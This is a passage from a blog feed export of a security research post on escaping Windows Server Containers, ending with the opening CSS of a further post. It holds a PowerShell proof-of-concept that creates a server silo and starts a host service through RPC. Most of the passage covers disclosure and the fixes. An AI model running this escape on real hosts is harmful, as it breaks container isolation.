c8"&gt;#}&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c15 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c0"&gt;Get-Win32ModuleSymbolFile&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c32"&gt;-Path&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$services_path&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c32"&gt;-OutPath&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c33 c8 c17 c20"&gt;$sym_path&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$rpc&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;=&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;Get-RpcServer&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$services_path&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c32"&gt;-SymbolPath&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$sym_path&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;|&lt;/span&gt;&lt;span class="c22 c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp;Select-RpcServer&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c32"&gt;-InterfaceId&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c27 c8 c17"&gt;&amp;#39;367abb81-9844-35f1-ad32-98f038001003&amp;#39;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$client&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;=&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;Get-RpcClient&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c33 c8 c17 c20"&gt;$rpc&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c33 c8 c17 c20"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$silo&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;=&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;New-NtJob&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c32"&gt;-CreateSilo&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c33 c8 c17 c32"&gt;-NoSiloRootDirectory&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c0"&gt;Set-NtProcessJob&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$silo&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c32 c33"&gt;-Current&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c0"&gt;Connect-RpcClient&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$client&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c32"&gt;-EndpointPath&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6 c33"&gt;ntsvcs&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c6 c33"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$scm&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;=&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$client&lt;/span&gt;&lt;span class="c8 c16"&gt;.&lt;/span&gt;&lt;span class="c8 c17"&gt;ROpenSCManagerW(&lt;/span&gt;&lt;span class="c8 c16"&gt;[&lt;/span&gt;&lt;span class="c8 c28 c17"&gt;NullString&lt;/span&gt;&lt;span class="c8 c16"&gt;]::&lt;/span&gt;&lt;span class="c8 c17"&gt;Value&lt;/span&gt;&lt;span class="c8 c16"&gt;,&lt;/span&gt;&lt;span class="c22 c8 c17"&gt;&amp;nbsp;`&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c16"&gt;&amp;nbsp;[&lt;/span&gt;&lt;span class="c8 c28 c17"&gt;NullString&lt;/span&gt;&lt;span class="c8 c16"&gt;]::&lt;/span&gt;&lt;span class="c8 c17"&gt;Value&lt;/span&gt;&lt;span class="c33 c8 c16"&gt;, `&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;[&lt;/span&gt;&lt;span class="c8 c17 c28"&gt;NtApiDotNet.Win32.ServiceControlManagerAccessRights&lt;/span&gt;&lt;span class="c8 c16"&gt;]::&lt;/span&gt;&lt;span class="c22 c8 c17"&gt;CreateService)&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$service&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;=&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$client&lt;/span&gt;&lt;span class="c8 c16"&gt;.&lt;/span&gt;&lt;span class="c8 c17"&gt;RCreateServiceW(&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$scm&lt;/span&gt;&lt;span class="c8 c16"&gt;.&lt;/span&gt;&lt;span class="c8 c17"&gt;p3&lt;/span&gt;&lt;span class="c8 c16"&gt;,&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c36"&gt;&amp;quot;GreatEscape&amp;quot;&lt;/span&gt;&lt;span class="c8 c16"&gt;,&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c36"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="c33 c8 c16"&gt;, `&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;[&lt;/span&gt;&lt;span class="c8 c28 c17"&gt;NtApiDotNet.Win32.ServiceAccessRights&lt;/span&gt;&lt;span class="c8 c16"&gt;]::&lt;/span&gt;&lt;span class="c8 c17"&gt;Start&lt;/span&gt;&lt;span class="c8 c16"&gt;,&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c26"&gt;0x10&lt;/span&gt;&lt;span class="c8 c16"&gt;,&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c26"&gt;0x3&lt;/span&gt;&lt;span class="c8 c16"&gt;,&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c26"&gt;0&lt;/span&gt;&lt;span class="c8 c16"&gt;,&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$cmd&lt;/span&gt;&lt;span class="c33 c8 c16"&gt;, `&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;[&lt;/span&gt;&lt;span class="c8 c28 c17"&gt;NullString&lt;/span&gt;&lt;span class="c8 c16"&gt;]::&lt;/span&gt;&lt;span class="c8 c17"&gt;Value&lt;/span&gt;&lt;span class="c8 c16"&gt;,&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$null&lt;/span&gt;&lt;span class="c8 c16"&gt;,&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$null&lt;/span&gt;&lt;span class="c8 c16"&gt;,&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c26"&gt;0&lt;/span&gt;&lt;span class="c8 c16"&gt;,&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;[&lt;/span&gt;&lt;span class="c8 c28 c17"&gt;NullString&lt;/span&gt;&lt;span class="c8 c16"&gt;]::&lt;/span&gt;&lt;span class="c8 c17"&gt;Value&lt;/span&gt;&lt;span class="c8 c16"&gt;,&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$null&lt;/span&gt;&lt;span class="c8 c16"&gt;,&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c26"&gt;0&lt;/span&gt;&lt;span class="c22 c8 c17"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c17"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$client&lt;/span&gt;&lt;span class="c8 c16"&gt;.&lt;/span&gt;&lt;span class="c8 c17"&gt;RStartServiceW(&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$service&lt;/span&gt;&lt;span class="c8 c16"&gt;.&lt;/span&gt;&lt;span class="c8 c17"&gt;p15&lt;/span&gt;&lt;span class="c8 c16"&gt;,&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c26"&gt;0&lt;/span&gt;&lt;span class="c8 c16"&gt;,&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c20"&gt;$null&lt;/span&gt;&lt;span class="c22 c8 c17"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;For this code to work it&amp;rsquo;s expected you have an administrator token in the &lt;/span&gt;&lt;span class="c2"&gt;$token&lt;/span&gt;&lt;span&gt;&amp;nbsp;variable to impersonate. Getting that token is left as an exercise for the reader. When you run it in a container the result should be the file &lt;/span&gt;&lt;span class="c2"&gt;hello.txt&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;written to the root of the host&amp;rsquo;s system drive.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c12" id="h.w1ugn9uzehzn"&gt;&lt;span class="c22 c34"&gt;Getting the Issues Fixed&lt;/span&gt;&lt;/h2&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;I have some server silo escapes, now what? I would prefer to get them fixed, however as already mentioned MSRC servicing criteria pointed out that Windows Server Containers are not a supported security boundary.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;I decided to report the registry symbolic link issue immediately, as I could argue that was something which would allow privilege escalation inside a container from a non-administrator. This would fit within the scope of a normal bug I&amp;rsquo;d find in Windows, it just required a special environment to function. This was &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2120"&gt;issue 2120&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which was fixed in February 2021 as &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-24096"&gt;CVE-2021-24096&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. The fix was pretty straightforward, the call to &lt;/span&gt;&lt;span class="c2"&gt;PsIsCurrentThreadInServerSilo &lt;/span&gt;&lt;span&gt;was removed as it was presumably redundant.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The issue with &lt;/span&gt;&lt;span class="c2"&gt;ContainerUser&lt;/span&gt;&lt;span&gt;&amp;nbsp;having &lt;/span&gt;&lt;span class="c2"&gt;SeImpersonatePrivilege&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;could be by design. I couldn&amp;rsquo;t find any official Microsoft or Docker documentation describing the behavior so I was wary of reporting it. That would be like reporting that a normal service account has the privilege, which is by design. So I held off on reporting this issue until I had a better understanding of the security expectations.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The situation with the other two silo escapes was more complicated as they explicitly crossed an undefended boundary. There was little point reporting them to Microsoft &lt;/span&gt;&lt;span&gt;if they &lt;/span&gt;&lt;span class="c11"&gt;wouldn&amp;rsquo;t be fixed. There would be more value in publicly releasing the information so that any users of the containers could try and find mitigating controls, or stop using Windows Server Container for anything where untrusted code could ever run.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;After much back and forth with various people in MSRC a decision was made. If a container escape works from a non-administrator user, basically if you can access resources outside of the container, then it would be considered a privilege escalation and therefore serviceable. This means that Daniel&amp;rsquo;s global symbolic link bug which kicked this all off still wouldn&amp;rsquo;t be eligible as it required SeTcbPrivilege which only administrators should be able to get. It might be fixed at some later point, but not as part of a bulletin.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;I reported the three other issues (the &lt;/span&gt;&lt;span class="c2"&gt;ContainerUser &lt;/span&gt;&lt;span&gt;issue was also considered to be in scope) as &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2127"&gt;2127&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2128"&gt;2128&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2129"&gt;2129&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. These were all fixed in March 2021 as &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26891"&gt;CVE-2021-26891&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26865"&gt;CVE-2021-26865&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26864"&gt;CVE-2021-26864&lt;/a&gt;&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;respectively.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Microsoft has not changed the MSRC servicing criteria at the time of writing. However, they will consider fixing any issue which on the surface &lt;/span&gt;&lt;span&gt;seems to escape a Windows Server Container &lt;/span&gt;&lt;span class="c11"&gt;but doesn&amp;rsquo;t require administrator privileges. It will be classed as an elevation of privilege.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c12" id="h.rqn8oqwagzde"&gt;&lt;span class="c22 c34"&gt;Conclusions&lt;/span&gt;&lt;/h2&gt; &lt;p class="c3"&gt;&lt;span&gt;The decision by Microsoft to not support Windows Server Containers as a security boundary looks to be a valid one, as there&amp;rsquo;s just so much attack surface here. While I managed to get four issues fixed I doubt that they&amp;rsquo;re the only ones which could be discovered and exploited. Ideally you should never run untrusted workloads in a Windows Server Container, but then it also probably shouldn&amp;rsquo;t provide remotely accessible services either. The only realistic use case for them is for internally visible services with little to no interactions with the rest of the world. The official guidance for GKE is to not use Windows Server Containers in hostile multi-tenancy scenarios. This is covered in the GKE documentation &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://cloud.google.com/kubernetes-engine/docs/concepts/windows-server-gke"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class="c11"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;Obviously, the recommended approach is to use Hyper-V isolation. That moves the needle and Hyper-V is at least a supported security boundary. However container escapes are still useful as getting full access to the hosting VM could be quite important in any successful escape. Not everyone can run Hyper-V though, which is why GKE isn&amp;#39;t currently using it.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/1279312763048126065/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/04/who-contains-containers.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/1279312763048126065" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/1279312763048126065" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/04/who-contains-containers.html" title="Who Contains the Containers?" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://1.bp.blogspot.com/-mKtn-agfB2M/YFTt-NApHyI/AAAAAAAAaxo/i50NObex2No87aTpiQ_nib9XQa_9wkFewCNcBGAsYHQ/s72-c/image1%2B%25283%2529.png" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-1665805603751590479</id>
    <published>2021-03-18T09:45:00.001-07:00</published>
    <updated>2021-03-18T09:57:05.633-07:00</updated>
    <title type="text">In-the-Wild Series: October 2020 0-day discovery</title>
    <content type="html">&lt;style type="text/css"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');ul.lst-kix_wl1qmy9tv69d-1{list-style-type:none}ul.lst-kix_wl1qmy9tv69d-0{list-style-type:none}ul.lst-kix_wl1qmy9tv69d-8{list-style-type:none}ul.lst-kix_wl1qmy9tv69d-7{list-style-type:none}ul.lst-kix_wl1qmy9tv69d-6{list-style-type:none}ul.lst-kix_wl1qmy9tv69d-5{list-style-type:none}ul.lst-kix_wl1qmy9tv69d-4{list-style-type:none}ul.lst-kix_wl1qmy9tv69d-3{list-style-type:none}ul.lst-kix_wl1qmy9tv69d-2{list-style-type:none}.lst-kix_vvah8cp3zgua-1&gt;li:before{content:"\0025cb  "}.lst-kix_kan00gftou8h-7&gt;li:before{content:"\0025cb  "}.lst-kix_a41x0ya2xyd3-6&gt;li:before{content:"\0025cf  "}.lst-kix_a41x0ya2xyd3-8&gt;li:before{content:"\0025a0  "}.lst-kix_vvah8cp3zgua-0&gt;li:before{content:"\0025cf  "}.lst-kix_kan00gftou8h-4&gt;li:before{content:"\0025cb  "}.lst-kix_kan00gftou8h-8&gt;li:before{content:"\0025a0  "}.lst-kix_a41x0ya2xyd3-3&gt;li:before{content:"\0025cf  "}.lst-kix_a41x0ya2xyd3-7&gt;li:before{content:"\0025cb  "}.lst-kix_a41x0ya2xyd3-4&gt;li:before{content:"\0025cb  "}.lst-kix_kan00gftou8h-5&gt;li:before{content:"\0025a0  "}.lst-kix_kan00gftou8h-6&gt;li:before{content:"\0025cf  "}.lst-kix_a41x0ya2xyd3-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_h07r6gi9x3gp-0{list-style-type:none}.lst-kix_h07r6gi9x3gp-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_40ztqamj21pm-1{list-style-type:none}ul.lst-kix_40ztqamj21pm-0{list-style-type:none}.lst-kix_vkloremw4n8w-2&gt;li:before{content:"\0025a0  "}.lst-kix_h07r6gi9x3gp-6&gt;li:before{content:"\0025cf  "}.lst-kix_a41x0ya2xyd3-0&gt;li:before{content:"\0025cf  "}.lst-kix_h07r6gi9x3gp-5&gt;li:before{content:"\0025a0  "}.lst-kix_vkloremw4n8w-3&gt;li:before{content:"\0025cf  "}.lst-kix_vkloremw4n8w-4&gt;li:before{content:"\0025cb  "}.lst-kix_h07r6gi9x3gp-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_h07r6gi9x3gp-8{list-style-type:none}ul.lst-kix_h07r6gi9x3gp-7{list-style-type:none}.lst-kix_vkloremw4n8w-5&gt;li:before{content:"\0025a0  "}.lst-kix_vkloremw4n8w-6&gt;li:before{content:"\0025cf  "}.lst-kix_h07r6gi9x3gp-2&gt;li:before{content:"\0025a0  "}.lst-kix_h07r6gi9x3gp-4&gt;li:before{content:"\0025cb  "}ul.lst-kix_h07r6gi9x3gp-6{list-style-type:none}.lst-kix_a41x0ya2xyd3-2&gt;li:before{content:"\0025a0  "}ul.lst-kix_h07r6gi9x3gp-5{list-style-type:none}ul.lst-kix_h07r6gi9x3gp-4{list-style-type:none}ul.lst-kix_h07r6gi9x3gp-3{list-style-type:none}ul.lst-kix_h07r6gi9x3gp-2{list-style-type:none}.lst-kix_a41x0ya2xyd3-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_h07r6gi9x3gp-1{list-style-type:none}.lst-kix_vkloremw4n8w-7&gt;li:before{content:"\0025cb  "}.lst-kix_vkloremw4n8w-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_e7a7d17rpo44-7{list-style-type:none}ul.lst-kix_vkloremw4n8w-4{list-style-type:none}ul.lst-kix_e7a7d17rpo44-6{list-style-type:none}ul.lst-kix_vkloremw4n8w-3{list-style-type:none}ul.lst-kix_vkloremw4n8w-6{list-style-type:none}ul.lst-kix_e7a7d17rpo44-8{list-style-type:none}ul.lst-kix_vkloremw4n8w-5{list-style-type:none}ul.lst-kix_e7a7d17rpo44-3{list-style-type:none}ul.lst-kix_vkloremw4n8w-8{list-style-type:none}ul.lst-kix_e7a7d17rpo44-2{list-style-type:none}ul.lst-kix_vkloremw4n8w-7{list-style-type:none}ul.lst-kix_e7a7d17rpo44-5{list-style-type:none}ul.lst-kix_e7a7d17rpo44-4{list-style-type:none}.lst-kix_h07r6gi9x3gp-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_e7a7d17rpo44-1{list-style-type:none}ul.lst-kix_e7a7d17rpo44-0{list-style-type:none}.lst-kix_e7a7d17rpo44-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_vkloremw4n8w-0{list-style-type:none}.lst-kix_kan00gftou8h-0&gt;li:before{content:"\0025cf  "}ul.lst-kix_vkloremw4n8w-2{list-style-type:none}.lst-kix_e7a7d17rpo44-2&gt;li:before{content:"\0025a0  "}ul.lst-kix_vkloremw4n8w-1{list-style-type:none}.lst-kix_kan00gftou8h-3&gt;li:before{content:"\0025cf  "}.lst-kix_e7a7d17rpo44-3&gt;li:before{content:"\0025cf  "}.lst-kix_e7a7d17rpo44-5&gt;li:before{content:"\0025a0  "}.lst-kix_kan00gftou8h-1&gt;li:before{content:"\0025cb  "}.lst-kix_kan00gftou8h-2&gt;li:before{content:"\0025a0  "}.lst-kix_e7a7d17rpo44-4&gt;li:before{content:"\0025cb  "}.lst-kix_e7a7d17rpo44-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_kan00gftou8h-7{list-style-type:none}ul.lst-kix_kan00gftou8h-6{list-style-type:none}ul.lst-kix_kan00gftou8h-8{list-style-type:none}.lst-kix_e7a7d17rpo44-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_kan00gftou8h-3{list-style-type:none}ul.lst-kix_kan00gftou8h-2{list-style-type:none}ul.lst-kix_kan00gftou8h-5{list-style-type:none}ul.lst-kix_kan00gftou8h-4{list-style-type:none}ul.lst-kix_kan00gftou8h-1{list-style-type:none}ul.lst-kix_kan00gftou8h-0{list-style-type:none}.lst-kix_e7a7d17rpo44-0&gt;li:before{content:"\0025cf  "}.lst-kix_e7a7d17rpo44-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_vvah8cp3zgua-5{list-style-type:none}ul.lst-kix_vvah8cp3zgua-6{list-style-type:none}.lst-kix_h07r6gi9x3gp-0&gt;li:before{content:"\0025cf  "}ul.lst-kix_vvah8cp3zgua-3{list-style-type:none}ul.lst-kix_vvah8cp3zgua-4{list-style-type:none}.lst-kix_h07r6gi9x3gp-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_vvah8cp3zgua-7{list-style-type:none}ul.lst-kix_vvah8cp3zgua-8{list-style-type:none}ul.lst-kix_40ztqamj21pm-8{list-style-type:none}ul.lst-kix_40ztqamj21pm-7{list-style-type:none}ul.lst-kix_40ztqamj21pm-6{list-style-type:none}ul.lst-kix_40ztqamj21pm-5{list-style-type:none}ul.lst-kix_40ztqamj21pm-4{list-style-type:none}ul.lst-kix_40ztqamj21pm-3{list-style-type:none}ul.lst-kix_40ztqamj21pm-2{list-style-type:none}.lst-kix_vkloremw4n8w-1&gt;li:before{content:"\0025cb  "}.lst-kix_vkloremw4n8w-0&gt;li:before{content:"\0025cf  "}ul.lst-kix_vvah8cp3zgua-1{list-style-type:none}ul.lst-kix_vvah8cp3zgua-2{list-style-type:none}ul.lst-kix_vvah8cp3zgua-0{list-style-type:none}.lst-kix_vvah8cp3zgua-2&gt;li:before{content:"\0025a0  "}.lst-kix_vvah8cp3zgua-3&gt;li:before{content:"\0025cf  "}.lst-kix_40ztqamj21pm-1&gt;li:before{content:"\0025cb  "}.lst-kix_vvah8cp3zgua-4&gt;li:before{content:"\0025cb  "}.lst-kix_vvah8cp3zgua-6&gt;li:before{content:"\0025cf  "}.lst-kix_40ztqamj21pm-2&gt;li:before{content:"\0025a0  "}.lst-kix_vvah8cp3zgua-5&gt;li:before{content:"\0025a0  "}.lst-kix_vvah8cp3zgua-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_a41x0ya2xyd3-8{list-style-type:none}ul.lst-kix_a41x0ya2xyd3-7{list-style-type:none}ul.lst-kix_a41x0ya2xyd3-6{list-style-type:none}.lst-kix_wl1qmy9tv69d-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_a41x0ya2xyd3-5{list-style-type:none}.lst-kix_40ztqamj21pm-0&gt;li:before{content:"\0025cf  "}.lst-kix_vvah8cp3zgua-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_a41x0ya2xyd3-4{list-style-type:none}.lst-kix_wl1qmy9tv69d-7&gt;li:before{content:"\0025cb  